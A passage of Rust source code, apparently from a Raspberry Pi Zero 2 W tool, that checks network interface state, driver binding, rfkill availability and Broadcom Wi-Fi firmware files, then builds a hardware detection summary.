            status: status.to_string(),
            details: vec!["Interface missing".to_string()],
            missing_paths,
            remediation: Some("Check hardware or image platform target".to_string()),
        };
    }

    let driver_link = sys_iface.join("device").join("driver");
    if !driver_link.exists() {
        missing_paths.push(driver_link.display().to_string());
        status = if required { "FAIL" } else { "WARN" };
        details.push("Driver binding missing".to_string());
    } else if let Ok(target) = fs::read_link(&driver_link) {
        if let Some(name) = target.file_name().and_then(|n| n.to_str()) {
            details.push(format!("Driver: {}", name));
        }
    }

    let operstate_path = sys_iface.join("operstate");
    if let Ok(state) = fs::read_to_string(&operstate_path) {
        details.push(format!("Operstate: {}", state.trim()));
    } else {
        missing_paths.push(operstate_path.display().to_string());
        if status == "OK" {
            status = "WARN";
        }
        details.push("Operstate unavailable".to_string());
    }

    let wireless_path = sys_iface.join("wireless");
    if wireless_path.exists() {
        if !Path::new("/dev/rfkill").exists() {
            missing_paths.push("/dev/rfkill".to_string());
            if status == "OK" {
                status = "WARN";
            }
            details.push("rfkill device missing".to_string());
        }
        if crate::system::rfkill_index_for_interface(iface).is_none() {
            if status == "OK" {
                status = "WARN";
            }
            details.push("rfkill index not found".to_string());
        }
    }

    SanityCheck {
        name: format!("interface:{iface}"),
        status: status.to_string(),
        details,
        missing_paths,
        remediation: None,
    }
}

fn check_wifi_firmware_sanity() -> SanityCheck {
    let mut missing = Vec::new();
    let mut details = Vec::new();
    let mut status = "OK";

    let required_bin = Path::new("/lib/firmware/brcm/brcmfmac43436-sdio.bin");
    if !required_bin.exists() {
        missing.push(required_bin.display().to_string());
        status = "WARN";
    } else {
        details.push(format!("Firmware: {}", required_bin.display()));
    }

    let optional_paths = [
        "/lib/firmware/brcm/brcmfmac43436-sdio.txt",
        "/lib/firmware/brcm/brcmfmac43436-sdio.clm_blob",
    ];
    for path in optional_paths {
        if Path::new(path).exists() {
            details.push(format!("Firmware: {path}"));
        } else {
            missing.push(path.to_string());
        }
    }

    SanityCheck {
        name: "wifi_firmware".to_string(),
        status: status.to_string(),
        details,
        missing_paths: missing,
        remediation: Some("Ensure Pi Zero 2 W firmware bundle is installed".to_string()),
    }
}

fn build_hardware_sanity_report() -> SanityReport {
    let mut overall = "OK".to_string();
    let mut checks = Vec::new();

    let wlan = check_interface_sanity("wlan0", true);
    record_status(&mut overall, &wlan.status);
    checks.push(wlan);

    let eth = check_interface_sanity("eth0", false);
    record_status(&mut overall, &eth.status);
    checks.push(eth);

    let fw = check_wifi_firmware_sanity();
    record_status(&mut overall, &fw.status);
    checks.push(fw);

    SanityReport { overall, checks }
}

fn handle_hardware_detect() -> Result<HandlerResult> {
    tracing::info!("Scanning hardware interfaces");

    let interfaces = list_interface_summaries()?;
    for iface in &interfaces {
        if iface.name == "lo" {
            continue;
        }
        tracing::info!(
            "[HW] iface={} kind={} state={} ip={:?}",
            iface.name,
            iface.kind,
            iface.oper_state,
            iface.ip
        );
    }

    // Categorize interfaces
    let mut ethernet_ports = Vec::new();
    let mut wifi_modules = Vec::new();
    let mut other_interfaces = Vec::new();

    for iface in &interfaces {
        // Skip loopback
        if iface.name == "lo" {
            continue;
        }

        match iface.kind.as_str() {
            "wireless" => wifi_modules.push(iface.clone()),
            "wired" => {
                // Only count ethernet if it's eth* or en*
                if iface.name.starts_with("eth") || iface.name.starts_with("en") {
                    ethernet_ports.push(iface.clone());
                } else {
                    other_interfaces.push(iface.clone());
                }
            }
            _ => other_interfaces.push(iface.clone()),
        }
    }

    let sanity = build_hardware_sanity_report();
    let data = json!({
        "ethernet_count": ethernet_ports.len(),
        "wifi_count": wifi_modules.len(),
        "other_count": other_interfaces.len(),
        "ethernet_ports": ethernet_ports,
        "wifi_modules": wifi_modules,
        "other_interfaces": other_interfaces,
        "total_interfaces": interfaces.len() - 1, // Exclude loopback
        "sanity": sanity,
    });

    let sanity_status = data
        .get("sanity")
        .and_then(|s| s.get("overall"))
        .and_then(|v| v.as_str())
        .unwrap_or("UNKNOWN");
    let summary = format!(
        "Found {} ethernet, {} wifi, {} other (Sanity: {})",
        ethernet_ports.len(),
        wifi_modules.len(),
        other_interfaces.len(),
        sanity_status
    );

    tracing::info!("Hardware scan complete: {summary}");
    Ok((summary, data))
}
